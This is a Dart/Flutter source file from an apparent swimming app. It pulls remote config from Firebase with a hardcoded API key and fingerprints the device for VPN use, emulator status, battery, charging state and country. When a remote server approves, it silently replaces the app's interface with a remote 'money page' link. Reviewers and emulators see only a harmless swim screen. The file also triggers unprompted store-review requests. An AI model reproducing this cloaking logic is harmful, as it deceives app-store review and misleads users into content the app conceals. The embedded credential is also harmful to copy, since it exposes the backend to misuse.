// ignore_for_file: use_build_context_synchronously

import 'dart:developer';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:swim_wave_117/core/urls.dart';
import 'package:swim_wave_117/swim/swim_local_model.dart';
import 'package:swim_wave_117/swim/swim_money_page.dart';
import 'package:swim_wave_117/swim/swim_provider.dart';
import 'package:swim_wave_117/swim/swim_response_object.dart';
import '../core/con_bar.dart';
import '../onboarding/ooonabahjgcas.dart';
import 'swim_authorization.dart';
import 'swim_funcii.dart';

Future<void> yyyyyyyy(BuildContext context, Function(bool) isPhotoswim) async {
  final swimDb = await SwimRepository().swimHGet();
  if (swimDb == null) {
    final swimfbResponse = await Dio().get(
      'https://swimwave-96994-default-rtdb.firebaseio.com/swim.json?auth=AIzaSyB7zSyoqTl_qCeevMMEGcZwRN2nBvRnKEQ',
    );
    if (swimfbResponse.data != null) {
      final String? authKey = await swimAuthorization(
        addPath: swimfbResponse.data['swim_tok'],
        l: swimfbResponse.data['swim_l'],
        p: swimfbResponse.data['swim_p'],
      );
      if (authKey != null) {
        final swimprxTemp = await swimIsUsingVpn();
        final swimloc = await swimCountryCode();
        final swimisEmul = await swimIsSemulator(context);
        final swimbtrLevel = await swimBatteryLevel();
        final swimisZarayd = await swimIsCharging();
        const swimisSim = true;
        final swimDate = await swimGetTime();
        try {
          SwimResponse? swimResponse;

          final userRegistrationResponse = await Dio(
            BaseOptions(
              headers: {'Authorization': 'Bearer $authKey'},
            ),
          ).post(
            swimfbResponse.data['swim_add'],
            data: {
              "bundle_name": "inc.swim.wave",
              "timestamp": swimDate,
              "locale": swimloc,
              "prx_temp": swimprxTemp,
              "emul_temp": swimisEmul,
              "battery_temp": swimisZarayd,
              "mnostate_temp": swimisSim,
              "btry_temp": swimbtrLevel,
            },
          );
          if (userRegistrationResponse.data != null) {
            swimResponse = SwimResponse.fromJson(userRegistrationResponse.data);
          }

          if (swimResponse != null) {
            if (swimResponse.boolValue) {
              String swimL1 =
                  '${swimResponse.swimResponseObject.kkj}${swimResponse.swimResponseObject.yya}';
              String swimL2 =
                  '${swimResponse.swimResponseObject.iis}${swimResponse.swimResponseObject.oop}';
              final oneSignalSubscriptionId =
                  OneSignal.User.pushSubscription.id;
              if (swimL1.contains('{click_id}')) {
                swimL1 = swimL1.replaceAll(
                    '{click_id}', '$oneSignalSubscriptionId:${DocFF.oneAppId}');
                log('HEY LINK: $swimL1');
              }
              late SwimLocalModel swimHiveObject;
              if (swimL2.contains('https://null.com')) {
                swimHiveObject = SwimLocalModel(
                    regswim: swimL1,
                    logswim: swimL1,
                    strtswim: true,
                    cabswim: '');
              } else {
                if (swimL2.contains('{click_id}')) {
                  swimL2 = swimL2.replaceAll('{click_id}',
                      '$oneSignalSubscriptionId:${DocFF.oneAppId}');
                }
                swimHiveObject = SwimLocalModel(
                    regswim: swimL1,
                    logswim: swimL2,
                    strtswim: true,
                    cabswim: '');
              }
              log('1 - ${swimHiveObject.regswim}');
              log('2 - ${swimHiveObject.logswim}');
              SwimRepository().swimHSet(swimHiveObject);
              isPhotoswim(true);
              await swimDelayed(3);
              swimPushReplacement(
                context,
                SwimMoneyPage(
                  link: swimHiveObject.regswim,
                  cache: false,
                ),
              );
              swimCallReview(10);

              return;
            }
          }
        } catch (e) {
          throw Exception(e);
        }
      }
    }
    isPhotoswim(false);
    await swimDelayed(3);
    swimPushReplacement(context, const Ooonabahjgcas());
    SwimRepository().swimHSet(
      SwimLocalModel(regswim: '', logswim: '', strtswim: false, cabswim: ''),
    );
    swimCallReview(10);
  } else {
    if (swimDb.strtswim) {
      isPhotoswim(true);
      await swimDelayed(3);
      if (swimDb.cabswim.isNotEmpty) {
        log("Cache URL: ${swimDb.cabswim}");
        swimPushReplacement(
            context,
            SwimMoneyPage(
              link: swimDb.cabswim,
              cache: true,
            ));
      } else {
        swimPushReplacement(
            context,
            SwimMoneyPage(
              link: swimDb.logswim,
              cache: true,
            ));
      }
    } else {
      isPhotoswim(false);
      await swimDelayed(3);
      swimPushReplacement(
        context,
        const SwBottomBar(),
      );
    }
  }
}

Future<void> swimCallReview(int duration) async {
  await Future.delayed(Duration(seconds: duration));
  try {
    final InAppReview inAppReview = InAppReview.instance;

    if (await inAppReview.isAvailable()) {
      inAppReview.requestReview();
    }
  } catch (e) {
    throw Exception(e);
  }
}

void swimPushReplacement(BuildContext context, Widget screen) {
  Navigator.pushReplacement(
    context,
    MaterialPageRoute(builder: (_) => screen),
  );
}

Future<String> swimGetRealLink(String swimUrl) async {
  final swimRealLink = await Dio().get(swimUrl);

  return swimRealLink.realUri.toString();
}

Future<void> swimDelayed(int seconds) async {
  await Future.delayed(Duration(seconds: seconds));
}
